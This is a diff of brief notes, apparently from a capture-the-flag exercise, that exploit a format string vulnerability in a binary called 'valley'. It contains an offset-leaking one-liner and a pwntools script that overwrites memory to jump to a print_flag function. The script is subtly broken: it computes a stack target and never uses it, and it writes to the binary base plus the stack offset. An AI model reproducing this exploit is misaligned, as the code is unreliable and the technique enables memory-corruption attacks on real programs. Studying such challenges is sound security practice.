@@ -1,5 +1,32 @@
 Format String vulnerability...
 
+find the offset
 python3 -c "print('ABCDEFGH|' + '|'.join(['%d:%%p' % i for i in range(1,40)]))" | ./valley | grep 4847
 	offset 6
 
+
+from pwn import *
+
+context.binary = elf = ELF('./valley')
+p = process('./valley')
+
+# Offsets (example only — adjust yours!)
+offset = 6
+
+# Get runtime PIE base manually from GDB (e.g., 0x555555554000)
+pie_base = 0x555555554000
+print_flag = pie_base + elf.symbols['print_flag']
+
+# Find return address offset on stack (e.g., position 10)
+target_addr_on_stack = 10
+
+# Split the print_flag address into two-byte chunks (little endian)
+writes = {
+    elf.address + offset: (print_flag & 0xffff),
+    elf.address + offset + 2: ((print_flag >> 16) & 0xffff),
+    # Add 4 if needed
+}
+
+payload = fmtstr_payload(offset, writes, write_size='short')
+p.sendline(payload)
+p.interactive()
